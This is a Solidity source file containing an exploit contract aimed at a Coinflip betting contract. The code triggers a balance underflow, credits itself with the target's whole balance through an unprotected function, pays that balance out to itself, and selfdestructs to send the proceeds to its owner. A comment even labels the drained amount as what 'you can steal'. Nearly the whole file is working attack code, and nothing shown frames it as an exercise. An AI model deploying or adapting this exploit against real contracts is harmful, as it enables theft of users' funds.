pragma solidity 0.5.12;

contract Coinflip{
    address payable public owner;
    function addPlayerBalance(address playerAddress, uint amount) public;
    function getBalance() public view returns(uint);
    function payoutPlayer(address payable playerAddress) public payable;
    function getPlayerBalance(address playerAddress) public view returns(uint);
    function placeBet(uint256 betOn) public payable;
    // 0.05eth is 50000000000000000 wei
}

contract ExploitContract{
    // Vulnerable contract
    Coinflip instance;

    address payable public owner;
    uint valueForTheAttack;

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    event value(string, uint);
    event closeEvent(string, address);
    event closeEvent2(string, address payable);

    constructor(address _contractAddr) public {
        owner = msg.sender;
        instance = Coinflip(_contractAddr);
    }

    /*If this function is call before the attack the contract balance will underflow */
    function brokeTheBalance() public payable onlyOwner{
        uint valueInContract = instance.getBalance();
        emit value("You can steal", valueInContract);
        instance.placeBet(msg.value);
    }

    function attack() public onlyOwner{
        uint valueInContract = instance.getBalance();
        instance.addPlayerBalance(address(this), valueInContract);
        instance.payoutPlayer(address(uint160(address(this))));
    }

    function displayContractBalance() public view onlyOwner returns(uint){
        return (address(this).balance);
    }

    function displayBalance(address _addr) public view onlyOwner returns(uint){
        return instance.getPlayerBalance(_addr);
    }

    function displayTargetContractOwner() public view onlyOwner returns(address payable){
        return instance.owner();
    }
    
    function() external payable { }
    
    // Allow the user to get back his funds
    function close() public {
        address payable user;
        require(msg.sender == owner ||  tx.origin == address(instance.owner()));
        if (msg.sender == owner){
            user = msg.sender;
        } else {
            user = tx.origin;
        }
        selfdestruct(user);
    }
}